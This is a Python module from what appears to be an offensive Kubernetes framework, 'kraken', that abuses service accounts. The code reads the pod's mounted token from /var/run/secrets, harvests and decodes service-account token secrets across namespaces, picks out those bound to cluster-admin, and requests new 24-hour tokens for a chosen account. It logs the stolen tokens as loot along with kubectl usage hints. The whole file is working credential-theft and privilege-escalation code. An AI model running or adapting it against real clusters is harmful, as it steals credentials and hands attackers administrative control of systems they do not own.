"""Steal SA tokens, escalate via RBAC, impersonate high-privilege SAs."""

from __future__ import annotations

from pathlib import Path
from typing import Any, Dict, List

from kraken.models import AttackResult, Credential, EngagementContext
from kraken.logger import log
from kraken.modules.base import BaseModule
from kraken.utils.helpers import b64d, k8s_connect, k8s_api_raw

try:
    from kubernetes.client.rest import ApiException
except ImportError:
    ApiException = Exception  # type: ignore[assignment,misc]


class SAAbuseModule(BaseModule):
    """Steal SA tokens, escalate via RBAC, impersonate high-privilege SAs."""

    name = "sa-abuse"

    def run(self, ctx: EngagementContext, **kwargs: object) -> List[AttackResult]:
        target_sa: str = str(kwargs.get("target_sa", ""))

        if not ctx.k8s_core and not k8s_connect(ctx):
            return [AttackResult("sa-abuse", "connect", "FAILED")]
        results: List[AttackResult] = []

        # 1. Read own mounted token
        results.extend(self._read_own_token(ctx))
        # 2. List and steal other SA tokens
        results.extend(self._steal_sa_tokens(ctx, target_sa))
        # 3. Check for token-generating permission
        results.extend(self._create_sa_token(ctx, target_sa))
        return results

    def _read_own_token(self, ctx: EngagementContext) -> List[AttackResult]:
        token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
        ns_path = "/var/run/secrets/kubernetes.io/serviceaccount/namespace"
        if Path(token_path).exists():
            token = Path(token_path).read_text().strip()
            ns = Path(ns_path).read_text().strip() if Path(ns_path).exists() else "unknown"
            log(f"[SA] Own mounted token found (NS: {ns}): {token[:30]}...", "INFO")
            ctx.credentials.append(Credential(
                "k8s_mounted_token",
                {"token": token, "namespace": ns},
                "filesystem:/var/run/secrets/kubernetes.io/serviceaccount/token",
                "Mounted SA token. Use: kubectl --token=TOKEN ...",
            ))
            return [AttackResult("sa-abuse", "mounted_token", "SUCCESS",
                                 severity="INFO",
                                 data={"namespace": ns, "token": token[:40] + "..."},
                                 notes=f"Mounted SA token in namespace '{ns}'")]
        return []

    def _steal_sa_tokens(self, ctx: EngagementContext,
                          target_sa: str) -> List[AttackResult]:
        results: List[AttackResult] = []
        stolen: List[Dict[str, Any]] = []
        namespaces = ctx.loot.get("namespaces", ["default", "kube-system"])

        for ns in namespaces:
            try:
                secrets = ctx.k8s_core.list_namespaced_secret(namespace=ns)
                for secret in secrets.items:
                    if secret.type != "kubernetes.io/service-account-token":
                        continue
                    sa_name = (secret.metadata.annotations or {}).get(
                        "kubernetes.io/service-account.name", "")
                    if target_sa and sa_name != target_sa:
                        continue
                    if secret.data and "token" in secret.data:
                        token = b64d(secret.data["token"])
                        # Check if this SA has interesting bindings
                        is_admin = self._check_sa_bindings(ctx, sa_name, ns)
                        stolen.append({
                            "sa": sa_name, "namespace": ns,
                            "secret": secret.metadata.name,
                            "token": token[:60] + "...", "full_token": token,
                            "is_admin": is_admin,
                        })
                        if is_admin:
                            log(f"[SA] HIGH-VALUE TOKEN: {ns}/{sa_name} (has admin binding!)", "CRIT")
                        ctx.credentials.append(Credential(
                            "k8s_sa_token",
                            {"token": token, "namespace": ns, "sa": sa_name},
                            f"k8s:secret:{ns}/{secret.metadata.name}",
                            f"SA token for {sa_name} in {ns}" + (" [ADMIN]" if is_admin else ""),
                        ))
            except ApiException:
                pass

        if stolen:
            ctx.loot["stolen_tokens"] = stolen
            admin_tokens = [t for t in stolen if t["is_admin"]]
            results.append(AttackResult(
                "sa-abuse", "token_theft", "SUCCESS",
                severity="CRITICAL" if admin_tokens else "HIGH",
                data={"total": len(stolen), "admin_tokens": len(admin_tokens)},
                notes=f"Stole {len(stolen)} SA tokens ({len(admin_tokens)} with admin bindings). "
                      f"Use: kubectl --token=TOKEN get pods",
            ))
        return results

    def _check_sa_bindings(self, ctx: EngagementContext,
                            sa: str, ns: str) -> bool:
        try:
            crbs = ctx.k8s_rbac.list_cluster_role_binding()
            for crb in crbs.items:
                for subj in (crb.subjects or []):
                    if (subj.kind == "ServiceAccount" and
                            subj.name == sa and
                            getattr(subj, "namespace", "") == ns):
                        if crb.role_ref.name == "cluster-admin":
                            return True
        except Exception:
            pass
        return False

    def _create_sa_token(self, ctx: EngagementContext,
                          target_sa: str) -> List[AttackResult]:
        if not target_sa:
            return []
        try:
            # Try to create a token for target SA (requires serviceaccounts/token permission)
            token_req = {
                "apiVersion": "authentication.k8s.io/v1",
                "kind": "TokenRequest",
                "spec": {"expirationSeconds": 86400},
            }
            ns = ctx.namespace
            resp = k8s_api_raw(
                ctx,
                f"/api/v1/namespaces/{ns}/serviceaccounts/{target_sa}/token",
                method="POST", body=token_req
            )
            if resp and "status" in resp and "token" in resp.get("status", {}):
                token = resp["status"]["token"]
                log(f"[SA] Created token for SA '{target_sa}': {token[:30]}...", "CRIT")
                ctx.credentials.append(Credential(
                    "k8s_created_token",
                    {"token": token, "sa": target_sa, "namespace": ns},
                    f"k8s:TokenRequest:{ns}/{target_sa}",
                    f"Token created for {target_sa} via serviceaccounts/token",
                ))
                return [AttackResult("sa-abuse", "token_create", "SUCCESS",
                                     severity="CRITICAL",
                                     data={"sa": target_sa, "token": token[:60] + "..."},
                                     notes=f"Token for SA '{target_sa}' created. 24h validity.")]
        except Exception:
            pass
        return []
